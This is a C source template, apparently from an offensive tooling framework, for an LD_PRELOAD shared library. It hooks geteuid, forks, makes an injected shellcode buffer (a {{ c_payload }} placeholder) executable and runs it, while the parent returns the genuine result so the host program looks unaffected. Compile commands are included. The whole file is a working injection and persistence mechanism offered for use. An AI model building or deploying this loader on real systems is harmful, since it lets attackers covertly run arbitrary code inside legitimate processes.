#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// To compile:
// gcc -Wall -fPIC -z execstack -c -o ld_preload.o ld_preload.c
// gcc -shared -o ld_preload.so ld_preload.o -ldl

// Shellcode
{{ c_payload }}

uid_t geteuid(void)
{
        // Get the address of the original 'geteuid' function
        typeof(geteuid) *old_geteuid;
        old_geteuid = dlsym(RTLD_NEXT, "geteuid");

        // Fork a new thread based on the current one
        if (fork() == 0)
        {
                // Execute shellcode in the new thread
                intptr_t pagesize = sysconf(_SC_PAGESIZE);

                // Make memory executable (required in libs)
                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
                        // Handle error
                        perror("mprotect");
                        return -1;
                }

                // Cast and execute
                int (*ret)() = (int(*)())buf;
                ret();
        }
        else
        {
                // Original thread, call the original function
                printf("[Hijacked] Returning from function...\n");
                return (*old_geteuid)();
        }
        // This shouldn't really execute
        printf("[Hijacked] Returning from main...\n");
        return -2;
}
